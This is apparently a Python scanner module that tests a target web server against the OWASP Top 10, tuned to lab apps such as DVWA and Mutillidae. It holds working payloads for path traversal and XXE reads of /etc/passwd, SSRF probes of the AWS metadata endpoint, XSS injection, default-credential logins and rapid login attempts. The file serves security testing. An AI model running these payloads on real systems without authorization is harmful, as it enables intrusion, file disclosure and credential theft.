"""
Expedite Strike OWASP Top 10 & CWE Testing Engine
==========================================
Comprehensive testing against OWASP Top 10 (2021) and mapped CWE IDs.
Each test provides real exploitation proof, not just detection.

FOR AUTHORIZED LAB TESTING ONLY.
"""

import http.client
import ssl
import urllib.parse
import re
import socket
import json
import time
from typing import Callable, Optional

_log_fn: Optional[Callable] = None

def _log(msg):
    if _log_fn:
        _log_fn(msg)

def _http_get(ip, port, path, headers=None, timeout=5):
    try:
        if port in (443, 8443):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(ip, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(ip, port, timeout=timeout)
        conn.request("GET", path, headers=headers or {})
        resp = conn.getresponse()
        body = resp.read(8000).decode("utf-8", errors="ignore")
        hdrs = dict(resp.getheaders())
        conn.close()
        return resp.status, body, hdrs
    except:
        return 0, "", {}

def _http_post(ip, port, path, data, content_type="application/x-www-form-urlencoded", headers=None, timeout=5):
    try:
        if port in (443, 8443):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(ip, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(ip, port, timeout=timeout)
        h = {"Content-Type": content_type}
        if headers:
            h.update(headers)
        conn.request("POST", path, body=data, headers=h)
        resp = conn.getresponse()
        body = resp.read(8000).decode("utf-8", errors="ignore")
        hdrs = dict(resp.getheaders())
        conn.close()
        return resp.status, body, hdrs
    except:
        return 0, "", {}


# ══════════════════════════════════════════════════════════════════════
# A01: BROKEN ACCESS CONTROL
# CWE-200, CWE-284, CWE-285, CWE-352, CWE-639
# ══════════════════════════════════════════════════════════════════════

def test_a01_broken_access_control(ip, port, svc):
    """A01:2021 Broken Access Control — IDOR, path traversal, forced browsing, CORS."""
    findings = []

    # 1. Directory Traversal
    traversal_payloads = [
        ("../../../../etc/passwd", "path traversal"),
        ("..\\..\\..\\..\\windows\\win.ini", "windows traversal"),
        ("/etc/passwd", "direct path"),
    ]
    for param_path in ["/dvwa/vulnerabilities/fi/?page=", "/mutillidae/index.php?page=",
                       "/?file=", "/?page=", "/?path=", "/?doc=", "/?template="]:
        for payload, desc in traversal_payloads:
            status, body, _ = _http_get(ip, port, param_path + payload)
            if status == 200 and ("root:" in body or "[fonts]" in body):
                findings.append({
                    "title": f"Path Traversal ({desc})",
                    "proof": f"Readable via {param_path}: {body[:150]}",
                    "cwe": "CWE-22", "severity": "Critical",
                    "owasp": "A01:2021"
                })
                break

    # 2. Forced Browsing / Unprotected endpoints
    admin_paths = [
        "/admin/", "/admin/config", "/admin/users",
        "/backup/", "/backups/", "/db/", "/database/",
        "/config.php.bak", "/wp-config.php.old", "/.env",
        "/server-status", "/server-info",
        "/phpinfo.php", "/info.php", "/test.php",
        "/debug/", "/trace/", "/console/",
    ]
    for path in admin_paths:
        status, body, _ = _http_get(ip, port, path)
        if status == 200 and len(body) > 50:
            if any(w in body.lower() for w in ["phpinfo", "password", "config", "admin", "database", "debug"]):
                findings.append({
                    "title": f"Forced Browsing: {path}",
                    "proof": f"Accessible! ({status}) Content: {body[:100]}",
                    "cwe": "CWE-425", "severity": "High",
                    "owasp": "A01:2021"
                })

    # 3. IDOR (Insecure Direct Object Reference)
    idor_paths = ["/user?id=1", "/user?id=2", "/profile?id=1", "/account?id=1",
                  "/api/user/1", "/api/user/2", "/api/users"]
    for path in idor_paths:
        status, body, _ = _http_get(ip, port, path)
        if status == 200 and len(body) > 20:
            findings.append({
                "title": f"Potential IDOR: {path}",
                "proof": f"Object accessible: {body[:100]}",
                "cwe": "CWE-639", "severity": "High",
                "owasp": "A01:2021"
            })
            break

    # 4. CORS Misconfiguration
    status, body, hdrs = _http_get(ip, port, "/", headers={"Origin": "https://evil.com"})
    cors_header = hdrs.get("Access-Control-Allow-Origin", hdrs.get("access-control-allow-origin", ""))
    if cors_header in ("*", "https://evil.com"):
        findings.append({
            "title": "CORS Misconfiguration",
            "proof": f"Access-Control-Allow-Origin: {cors_header} (allows any origin!)",
            "cwe": "CWE-942", "severity": "High",
            "owasp": "A01:2021"
        })

    if findings:
        proof = f"A01 Broken Access Control: {len(findings)} finding(s)\n"
        for f in findings:
            proof += f"  [{f['cwe']}] {f['title']}: {f['proof'][:100]}\n"
        return {"success": True, "proof": proof, "severity": "Critical",
                "cve": "A01-BAC", "exploit_name": f"OWASP A01: {len(findings)} Access Control Failures",
                "mitre_id": "T1083", "creds": False, "data": {"findings": findings}}
    return {"success": False, "proof": "No broken access control found"}


# ══════════════════════════════════════════════════════════════════════
# A02: CRYPTOGRAPHIC FAILURES
# CWE-259, CWE-327, CWE-328, CWE-330
# ══════════════════════════════════════════════════════════════════════

def test_a02_crypto_failures(ip, port, svc):
    """A02:2021 Cryptographic Failures — weak TLS, sensitive data exposure, weak hashing."""
    findings = []

    # 1. Check for HTTP (no TLS) on sensitive endpoints
    sensitive_paths = ["/login", "/login.php", "/admin/", "/wp-login.php",
                      "/dvwa/login.php", "/mutillidae/index.php"]
    if port in (80, 8080, 8000):
        for path in sensitive_paths:
            status, body, _ = _http_get(ip, port, path)
            if status == 200 and ("password" in body.lower() or "login" in body.lower()):
                findings.append({
                    "title": f"Login over HTTP: {path}",
                    "proof": "Credentials transmitted in cleartext!",
                    "cwe": "CWE-319", "severity": "High",
                    "owasp": "A02:2021"
                })
                break

    # 2. Check for weak TLS
    if port in (443, 8443):
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            ctx.maximum_version = ssl.TLSVersion.TLSv1  # Try TLS 1.0
            sock = socket.create_connection((ip, port), timeout=3)
            ssock = ctx.wrap_socket(sock)
            ver = ssock.version()
            ssock.close()
            if "TLSv1.0" in str(ver) or "TLSv1.1" in str(ver):
                findings.append({
                    "title": f"Weak TLS: {ver}",
                    "proof": f"Server supports deprecated {ver}",
                    "cwe": "CWE-326", "severity": "Medium",
                    "owasp": "A02:2021"
                })
        except: pass

    # 3. Exposed sensitive data in responses
    for path in ["/", "/index.php", "/login.php"]:
        status, body, hdrs = _http_get(ip, port, path)
        if status == 200:
            # Check for exposed passwords, API keys, tokens
            patterns = [
                (r'password["\s]*[:=]["\s]*[^"]{3,30}', "Hardcoded password"),
                (r'api[_-]?key["\s]*[:=]["\s]*[a-zA-Z0-9]{10,}', "API key exposed"),
                (r'secret["\s]*[:=]["\s]*[^"]{5,}', "Secret exposed"),
                (r'token["\s]*[:=]["\s]*[a-zA-Z0-9]{10,}', "Token exposed"),
            ]
            for pattern, desc in patterns:
                match = re.search(pattern, body, re.IGNORECASE)
                if match:
                    findings.append({
                        "title": desc,
                        "proof": f"Found in {path}: {match.group(0)[:50]}",
                        "cwe": "CWE-200", "severity": "High",
                        "owasp": "A02:2021"
                    })

    # 4. Missing security headers
    status, _, hdrs = _http_get(ip, port, "/")
    missing = []
    for hdr in ["Strict-Transport-Security", "X-Content-Type-Options",
                "X-Frame-Options", "Content-Security-Policy"]:
        if hdr.lower() not in {k.lower(): v for k, v in hdrs.items()}:
            missing.append(hdr)
    if missing:
        findings.append({
            "title": f"Missing Security Headers: {', '.join(missing[:3])}",
            "proof": f"{len(missing)} security headers missing",
            "cwe": "CWE-693", "severity": "Medium",
            "owasp": "A02:2021"
        })

    if findings:
        proof = f"A02 Cryptographic Failures: {len(findings)} finding(s)\n"
        for f in findings:
            proof += f"  [{f['cwe']}] {f['title']}\n"
        return {"success": True, "proof": proof, "severity": "High",
                "cve": "A02-CRYPTO", "exploit_name": f"OWASP A02: {len(findings)} Crypto Failures",
                "mitre_id": "T1557", "creds": False, "data": {"findings": findings}}
    return {"success": False, "proof": "No crypto failures found"}


# ══════════════════════════════════════════════════════════════════════
# A03: INJECTION (XSS, SQLi, Command Injection, LDAP, XPath)
# CWE-79, CWE-89, CWE-78, CWE-77
# ══════════════════════════════════════════════════════════════════════

def test_a03_xss(ip, port, svc):
    """A03:2021 XSS — Reflected, Stored, DOM-based Cross-Site Scripting."""
    findings = []
    xss_payload = "<script>alert('XSTRIKE_XSS')</script>"
    xss_encoded = urllib.parse.quote(xss_payload)

    # Reflected XSS targets
    targets = [
        (f"/dvwa/vulnerabilities/xss_r/?name={xss_encoded}#", "DVWA Reflected XSS"),
        (f"/mutillidae/index.php?page=dns-lookup.php&target_host={xss_encoded}", "Mutillidae XSS"),
        (f"/search.php?q={xss_encoded}", "Search XSS"),
        (f"/index.php?search={xss_encoded}", "Index XSS"),
        (f"/?q={xss_encoded}", "Query XSS"),
    ]

    for url, desc in targets:
        status, body, _ = _http_get(ip, port, url)
        if status == 200 and "XSTRIKE_XSS" in body:
            findings.append({
                "title": f"Reflected XSS: {desc}",
                "proof": f"Payload reflected unescaped in response",
                "cwe": "CWE-79", "severity": "High",
                "owasp": "A03:2021"
            })

    # DOM-based XSS check
    dom_targets = [
        (f"/dvwa/vulnerabilities/xss_d/?default={xss_encoded}", "DVWA DOM XSS"),
    ]
    for url, desc in dom_targets:
        status, body, _ = _http_get(ip, port, url)
        if status == 200 and ("document.location" in body or "innerHTML" in body):
            findings.append({
                "title": f"DOM XSS: {desc}",
                "proof": "Client-side code uses unsafe DOM manipulation",
                "cwe": "CWE-79", "severity": "High",
                "owasp": "A03:2021"
            })

    # Stored XSS attempt (via guestbook, comments)
    stored_targets = [
        ("/dvwa/vulnerabilities/xss_s/", f"txtName=XStrike&mtxMessage={xss_encoded}&btnSign=Sign+Guestbook", "DVWA Stored XSS"),
    ]
    for url, data, desc in stored_targets:
        status, body, _ = _http_post(ip, port, url, data)
        if status == 200 and "XSTRIKE_XSS" in body:
            findings.append({
                "title": f"Stored XSS: {desc}",
                "proof": "Payload persisted and rendered in page!",
                "cwe": "CWE-79", "severity": "Critical",
                "owasp": "A03:2021"
            })

    if findings:
        proof = f"A03 XSS: {len(findings)} finding(s)\n"
        for f in findings:
            proof += f"  [{f['cwe']}] {f['title']}: {f['proof'][:80]}\n"
        return {"success": True, "proof": proof, "severity": "High",
                "cve": "A03-XSS", "exploit_name": f"OWASP A03: {len(findings)} XSS Vulnerabilities",
                "mitre_id": "T1059.007", "creds": False, "data": {"findings": findings}}
    return {"success": False, "proof": "No XSS found"}


# ══════════════════════════════════════════════════════════════════════
# A04: INSECURE DESIGN
# CWE-209, CWE-256, CWE-501, CWE-522
# ══════════════════════════════════════════════════════════════════════

def test_a04_insecure_design(ip, port, svc):
    """A04:2021 Insecure Design — rate limiting, error messages, design flaws."""
    findings = []

    # 1. Verbose error messages
    error_paths = ["/index.php?id='", "/page.php?id=999999", "/%00", "/doesnotexist.php"]
    for path in error_paths:
        status, body, _ = _http_get(ip, port, path)
        if any(w in body.lower() for w in ["stack trace", "traceback", "exception",
                "mysql_", "pg_query", "warning:", "fatal error", "debug"]):
            findings.append({
                "title": f"Verbose Error at {path}",
                "proof": f"Debug info exposed: {body[:150]}",
                "cwe": "CWE-209", "severity": "Medium",
                "owasp": "A04:2021"
            })
            break

    # 2. No rate limiting on login
    login_paths = ["/dvwa/login.php", "/login.php", "/wp-login.php",
                   "/mutillidae/index.php?page=login.php"]
    for path in login_paths:
        status, body, _ = _http_get(ip, port, path)
        if status == 200 and "password" in body.lower():
            # Try 5 rapid logins
            blocked = False
            for i in range(5):
                s, b, _ = _http_post(ip, port, path,
                    "username=admin&password=wrong&Login=Login")
                if s in (429, 403) or "blocked" in b.lower() or "locked" in b.lower():
                    blocked = True
                    break
            if not blocked:
                findings.append({
                    "title": f"No Rate Limiting: {path}",
                    "proof": "5 rapid login attempts — no lockout or rate limit!",
                    "cwe": "CWE-307", "severity": "High",
                    "owasp": "A04:2021"
                })
                break

    # 3. Security questions / password hints
    for path in ["/forgot.php", "/forgot-password", "/password-recovery"]:
        status, body, _ = _http_get(ip, port, path)
        if status == 200 and ("security question" in body.lower() or "hint" in body.lower()):
            findings.append({
                "title": f"Security Questions: {path}",
                "proof": "Weak recovery mechanism",
                "cwe": "CWE-640", "severity": "Medium",
                "owasp": "A04:2021"
            })

    if findings:
        proof = f"A04 Insecure Design: {len(findings)} finding(s)\n"
        for f in findings:
            proof += f"  [{f['cwe']}] {f['title']}\n"
        return {"success": True, "proof": proof, "severity": "High",
                "cve": "A04-DESIGN", "exploit_name": f"OWASP A04: {len(findings)} Design Flaws",
                "mitre_id": "T1110", "creds": False, "data": {"findings": findings}}
    return {"success": False, "proof": "No insecure design issues found"}


# ══════════════════════════════════════════════════════════════════════
# A05: SECURITY MISCONFIGURATION (includes XXE)
# CWE-16, CWE-611
# ══════════════════════════════════════════════════════════════════════

def test_a05_misconfig(ip, port, svc):
    """A05:2021 Security Misconfiguration — default configs, XXE, directory listing."""
    findings = []

    # 1. Directory listing
    dirs_to_check = ["/images/", "/uploads/", "/files/", "/backup/",
                     "/icons/", "/css/", "/js/", "/assets/", "/includes/"]
    for d in dirs_to_check:
        status, body, _ = _http_get(ip, port, d)
        if status == 200 and ("Index of" in body or "Directory listing" in body or "Parent Directory" in body):
            findings.append({
                "title": f"Directory Listing: {d}",
                "proof": f"Full directory contents exposed",
                "cwe": "CWE-548", "severity": "Medium",
                "owasp": "A05:2021"
            })

    # 2. Default credentials (already tested elsewhere, note it)
    # 3. Unnecessary features enabled
    methods_to_check = ["PUT", "DELETE", "TRACE", "OPTIONS"]
    for method in methods_to_check:
        try:
            conn = http.client.HTTPConnection(ip, port, timeout=3)
            conn.request(method, "/")
            resp = conn.getresponse()
            body = resp.read(2000).decode("utf-8", errors="ignore")
            conn.close()
            if method == "TRACE" and resp.status == 200 and "TRACE" in body:
                findings.append({
                    "title": "HTTP TRACE Enabled",
                    "proof": "XST (Cross-Site Tracing) possible",
                    "cwe": "CWE-693", "severity": "Medium",
                    "owasp": "A05:2021"
                })
            elif method == "PUT" and resp.status in (200, 201, 204):
                findings.append({
                    "title": "HTTP PUT Enabled",
                    "proof": "Can upload files via PUT method!",
                    "cwe": "CWE-16", "severity": "High",
                    "owasp": "A05:2021"
                })
        except: pass

    # 4. XXE (XML External Entity)
    xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""
    xxe_paths = ["/xml", "/api/xml", "/xmlrpc.php", "/soap",
                 "/dvwa/vulnerabilities/xxe/", "/mutillidae/index.php?page=xml-validator.php"]
    for path in xxe_paths:
        status, body, _ = _http_post(ip, port, path, xxe_payload,
                                     content_type="application/xml")
        if status == 200 and "root:" in body:
            findings.append({
                "title": f"XXE at {path}",
                "proof": f"File read via XXE: {body[:150]}",
                "cwe": "CWE-611", "severity": "Critical",
                "owasp": "A05:2021"
            })

    # 5. phpinfo() exposed
    for path in ["/phpinfo.php", "/info.php", "/php_info.php", "/test.php"]:
        status, body, _ = _http_get(ip, port, path)
        if status == 200 and "PHP Version" in body:
            findings.append({
                "title": f"phpinfo() at {path}",
                "proof": f"Full PHP configuration exposed",
                "cwe": "CWE-200", "severity": "Medium",
                "owasp": "A05:2021"
            })
            break

    if findings:
        proof = f"A05 Misconfiguration: {len(findings)} finding(s)\n"
        for f in findings:
            proof += f"  [{f['cwe']}] {f['title']}: {f['proof'][:80]}\n"
        return {"success": True, "proof": proof, "severity": "High",
                "cve": "A05-MISCONFIG", "exploit_name": f"OWASP A05: {len(findings)} Misconfigurations",
                "mitre_id": "T1190", "creds": False, "data": {"findings": findings}}
    return {"success": False, "proof": "No misconfigurations found"}


# ══════════════════════════════════════════════════════════════════════
# A06: VULNERABLE AND OUTDATED COMPONENTS
# CWE-1104
# ══════════════════════════════════════════════════════════════════════

def test_a06_vuln_components(ip, port, svc):
    """A06:2021 Vulnerable Components — outdated software detection."""
    findings = []

    # Check server headers for version info
    status, body, hdrs = _http_get(ip, port, "/")
    server = hdrs.get("Server", hdrs.get("server", ""))
    x_powered = hdrs.get("X-Powered-By", hdrs.get("x-powered-by", ""))

    if server:
        # Known vulnerable versions
        vuln_patterns = [
            (r"Apache/2\.[02]\.", "Apache 2.0/2.2 (EOL)", "High"),
            (r"Apache/2\.4\.[0-3][0-9]\b", "Apache 2.4.x (check patches)", "Medium"),
            (r"nginx/1\.[0-9]\.", "nginx 1.x (outdated)", "Medium"),
            (r"PHP/5\.", "PHP 5.x (EOL)", "High"),
            (r"PHP/7\.[0-3]\.", "PHP 7.0-7.3 (EOL)", "Medium"),
            (r"Microsoft-IIS/[67]\.", "IIS 6/7 (outdated)", "High"),
        ]
        for pattern, desc, sev in vuln_patterns:
            if re.search(pattern, server + " " + x_powered):
                findings.append({
                    "title": f"Outdated: {desc}",
                    "proof": f"Server: {server} | X-Powered-By: {x_powered}",
                    "cwe": "CWE-1104", "severity": sev,
                    "owasp": "A06:2021"
                })

    # Check for known vulnerable web apps
    vuln_apps = [
        ("/dvwa/", "DVWA", "Deliberately Vulnerable Web Application"),
        ("/mutillidae/", "Mutillidae", "OWASP Mutillidae — vulnerable by design"),
        ("/twiki/", "TWiki", "Legacy wiki with known CVEs"),
        ("/tikiwiki/", "TikiWiki", "Legacy CMS with known vulnerabilities"),
        ("/phpMyAdmin/", "phpMyAdmin", "Check version for CVEs"),
    ]
    for path, name, desc in vuln_apps:
        status, body, _ = _http_get(ip, port, path)
        if status == 200:
            findings.append({
                "title": f"Vulnerable App: {name}",
                "proof": desc,
                "cwe": "CWE-1104", "severity": "High",
                "owasp": "A06:2021"
            })

    if findings:
        proof = f"A06 Vulnerable Components: {len(findings)} finding(s)\n"
        for f in findings:
            proof += f"  [{f['cwe']}] {f['title']}: {f['proof'][:80]}\n"
        return {"success": True, "proof": proof, "severity": "High",
                "cve": "A06-VULN-COMP", "exploit_name": f"OWASP A06: {len(findings)} Vulnerable Components",
                "mitre_id": "T1190", "creds": False, "data": {"findings": findings}}
    return {"success": False, "proof": "No vulnerable components found"}


# ══════════════════════════════════════════════════════════════════════
# A07: IDENTIFICATION AND AUTHENTICATION FAILURES
# CWE-287, CWE-384, CWE-798
# ══════════════════════════════════════════════════════════════════════

def test_a07_auth_failures(ip, port, svc):
    """A07:2021 Auth Failures — weak passwords, session issues, credential stuffing."""
    findings = []

    # 1. Default / weak credentials on web apps
    login_targets = [
        ("/dvwa/login.php", "username=admin&password=password&Login=Login", "admin:password", "DVWA"),
        ("/dvwa/login.php", "username=admin&password=admin&Login=Login", "admin:admin", "DVWA"),
        ("/phpmyadmin/", "", "", "phpMyAdmin"),
        ("/mutillidae/index.php?page=login.php", "username=admin&password=admin&login-php-submit-button=Login", "admin:admin", "Mutillidae"),
    ]
    for path, data, creds, app in login_targets:
        if data:
            status, body, hdrs = _http_post(ip, port, path, data)
            if status in (200, 302) and ("welcome" in body.lower() or "logout" in body.lower()
                                        or "location" in str(hdrs).lower()):
                findings.append({
                    "title": f"Default Creds: {app} ({creds})",
                    "proof": f"Login successful with {creds}!",
                    "cwe": "CWE-798", "severity": "Critical",
                    "owasp": "A07:2021"
                })

    # 2. Session fixation / weak session tokens
    status1, _, hdrs1 = _http_get(ip, port, "/")
    cookies = hdrs1.get("Set-Cookie", hdrs1.get("set-cookie", ""))
    if cookies:
        if "httponly" not in cookies.lower():
            findings.append({
                "title": "Session Cookie Missing HttpOnly",
                "proof": f"Cookie: {cookies[:100]}",
                "cwe": "CWE-1004", "severity": "Medium",
                "owasp": "A07:2021"
            })
        if "secure" not in cookies.lower() and port in (443, 8443):
            findings.append({
                "title": "Session Cookie Missing Secure Flag",
                "proof": f"Cookie sent over HTTPS without Secure flag",
                "cwe": "CWE-614", "severity": "Medium",
                "owasp": "A07:2021"
            })

    # 3. Username enumeration
    enum_paths = [
        ("/dvwa/login.php", "username=nonexistent&password=test&Login=Login"),
        ("/dvwa/login.php", "username=admin&password=test&Login=Login"),
    ]
    responses = []
    for path, data in enum_paths:
        status, body, _ = _http_post(ip, port, path, data)
        responses.append((status, len(body), body[:200]))
    if len(responses) == 2 and responses[0][1] != responses[1][1]:
        findings.append({
            "title": "Username Enumeration",
            "proof": "Different response lengths for valid vs invalid usernames",
            "cwe": "CWE-204", "severity": "Medium",
            "owasp": "A07:2021"
        })

    if findings:
        proof = f"A07 Auth Failures: {len(findings)} finding(s)\n"
        for f in findings:
            proof += f"  [{f['cwe']}] {f['title']}: {f['proof'][:80]}\n"
        return {"success": True, "proof": proof, "severity": "Critical",
                "cve": "A07-AUTH", "exploit_name": f"OWASP A07: {len(findings)} Auth Failures",
                "mitre_id": "T1078", "creds": True, "data": {"findings": findings}}
    return {"success": False, "proof": "No auth failures found"}


# ══════════════════════════════════════════════════════════════════════
# A08: SOFTWARE AND DATA INTEGRITY FAILURES
# CWE-502 (Insecure Deserialization)
# ══════════════════════════════════════════════════════════════════════

def test_a08_integrity(ip, port, svc):
    """A08:2021 Integrity Failures — insecure deserialization, unsigned updates."""
    findings = []

    # 1. Check for Java deserialization endpoints
    deser_paths = ["/invoker/JMXInvokerServlet", "/invoker/EJBInvokerServlet",
                   "/jmx-console/", "/web-console/", "/status"]
    for path in deser_paths:
        status, body, hdrs = _http_get(ip, port, path)
        ct = hdrs.get("Content-Type", hdrs.get("content-type", ""))
        if status == 200 and ("java" in ct.lower() or "serialization" in ct.lower()
                             or "jmx" in body.lower() or "jboss" in body.lower()):
            findings.append({
                "title": f"Deserialization endpoint: {path}",
                "proof": f"Java serialization endpoint accessible",
                "cwe": "CWE-502", "severity": "Critical",
                "owasp": "A08:2021"
            })

    # 2. Check for CI/CD related exposure
    ci_paths = ["/.github/workflows/", "/.gitlab-ci.yml", "/Jenkinsfile",
                "/.circleci/config.yml", "/docker-compose.yml"]
    for path in ci_paths:
        status, body, _ = _http_get(ip, port, path)
        if status == 200 and len(body) > 20:
            findings.append({
                "title": f"CI/CD Config Exposed: {path}",
                "proof": f"Pipeline configuration accessible: {body[:100]}",
                "cwe": "CWE-829", "severity": "High",
                "owasp": "A08:2021"
            })

    if findings:
        proof = f"A08 Integrity Failures: {len(findings)} finding(s)\n"
        for f in findings:
            proof += f"  [{f['cwe']}] {f['title']}\n"
        return {"success": True, "proof": proof, "severity": "Critical",
                "cve": "A08-INTEGRITY", "exploit_name": f"OWASP A08: {len(findings)} Integrity Issues",
                "mitre_id": "T1195", "creds": False, "data": {"findings": findings}}
    return {"success": False, "proof": "No integrity issues found"}


# ══════════════════════════════════════════════════════════════════════
# A09: SECURITY LOGGING AND MONITORING FAILURES
# CWE-778
# ══════════════════════════════════════════════════════════════════════

def test_a09_logging(ip, port, svc):
    """A09:2021 Logging Failures — exposed logs, no monitoring."""
    findings = []

    log_paths = ["/logs/", "/log/", "/debug.log", "/error.log", "/access.log",
                 "/var/log/", "/wp-content/debug.log", "/application.log",
                 "/server.log", "/catalina.out"]
    for path in log_paths:
        status, body, _ = _http_get(ip, port, path)
        if status == 200 and len(body) > 50:
            if any(w in body.lower() for w in ["error", "warning", "info", "debug",
                   "stack", "exception", "query", "select", "password"]):
                findings.append({
                    "title": f"Log File Exposed: {path}",
                    "proof": f"Sensitive log data readable: {body[:100]}",
                    "cwe": "CWE-532", "severity": "High",
                    "owasp": "A09:2021"
                })

    if findings:
        proof = f"A09 Logging Failures: {len(findings)} finding(s)\n"
        for f in findings:
            proof += f"  [{f['cwe']}] {f['title']}\n"
        return {"success": True, "proof": proof, "severity": "High",
                "cve": "A09-LOGGING", "exploit_name": f"OWASP A09: {len(findings)} Logging Issues",
                "mitre_id": "T1070", "creds": False, "data": {"findings": findings}}
    return {"success": False, "proof": "No logging issues found"}


# ══════════════════════════════════════════════════════════════════════
# A10: SERVER-SIDE REQUEST FORGERY (SSRF)
# CWE-918
# ══════════════════════════════════════════════════════════════════════

def test_a10_ssrf(ip, port, svc):
    """A10:2021 SSRF — Server-Side Request Forgery."""
    findings = []

    ssrf_payloads = [
        "http://127.0.0.1/",
        "http://localhost/server-status",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "file:///etc/passwd",
        "http://[::1]/",
    ]

    ssrf_paths = [
        "?url=", "?page=", "?target=", "?dest=", "?redirect=",
        "?uri=", "?path=", "?to=", "?out=", "?view=",
        "?domain=", "?feed=", "?host=", "?site=", "?html=",
    ]

    for param in ssrf_paths:
        for payload in ssrf_payloads:
            url = f"/{param}{urllib.parse.quote(payload)}"
            status, body, _ = _http_get(ip, port, url)
            if status == 200:
                if "root:" in body or "meta-data" in body or "Apache" in body:
                    findings.append({
                        "title": f"SSRF via {param}",
                        "proof": f"Internal resource accessible: {payload} → {body[:100]}",
                        "cwe": "CWE-918", "severity": "Critical",
                        "owasp": "A10:2021"
                    })
                    break

    # Check DVWA/Mutillidae specific SSRF
    dvwa_ssrf = [
        ("/dvwa/vulnerabilities/fi/?page=http://127.0.0.1/etc/passwd", "DVWA RFI/SSRF"),
        ("/mutillidae/index.php?page=http://127.0.0.1/", "Mutillidae SSRF"),
    ]
    for url, desc in dvwa_ssrf:
        status, body, _ = _http_get(ip, port, url)
        if status == 200 and ("root:" in body or "html" in body.lower()):
            findings.append({
                "title": f"SSRF: {desc}",
                "proof": f"Server fetched internal URL: {body[:100]}",
                "cwe": "CWE-918", "severity": "Critical",
                "owasp": "A10:2021"
            })

    if findings:
        proof = f"A10 SSRF: {len(findings)} finding(s)\n"
        for f in findings:
            proof += f"  [{f['cwe']}] {f['title']}: {f['proof'][:80]}\n"
        return {"success": True, "proof": proof, "severity": "Critical",
                "cve": "A10-SSRF", "exploit_name": f"OWASP A10: {len(findings)} SSRF",
                "mitre_id": "T1190", "creds": False, "data": {"findings": findings}}
    return {"success": False, "proof": "No SSRF found"}


# ══════════════════════════════════════════════════════════════════════
# PUBLIC API
# ══════════════════════════════════════════════════════════════════════

ALL_OWASP_TESTS = [
    test_a01_broken_access_control,
    test_a02_crypto_failures,
    test_a03_xss,
    test_a04_insecure_design,
    test_a05_misconfig,
    test_a06_vuln_components,
    test_a07_auth_failures,
    test_a08_integrity,
    test_a09_logging,
    test_a10_ssrf,
]

def run_owasp_top10(ip, port, host_data=None, log_fn=None):
    """Run complete OWASP Top 10 test suite against a web target."""
    global _log_fn
    _log_fn = log_fn
    results = []

    _log(f"\n  {'═'*50}")
    _log(f"  🛡️  OWASP TOP 10 ASSESSMENT: {ip}:{port}")
    _log(f"  {'═'*50}")

    for test_fn in ALL_OWASP_TESTS:
        if hasattr(test_fn, '__doc__') and test_fn.__doc__:
            test_name = test_fn.__doc__.split('—')[0].strip() if '—' in test_fn.__doc__ else test_fn.__doc__.split('.')[0]
        else:
            test_name = test_fn.__name__
        _log(f"\n  🔍 {test_name}")
        try:
            result = test_fn(ip, port, {})
            result["host"] = ip
            result["port"] = port
            if result.get("success"):
                _log(f"    [!] FOUND: {result.get('exploit_name', '?')}")
                results.append(result)
            else:
                _log(f"    ✓ Clean")
        except Exception as e:
            _log(f"    [x] Error: {e}")

    _log(f"\n  📊 OWASP Top 10: {len(results)}/10 categories with findings")
    _log_fn = None
    return results
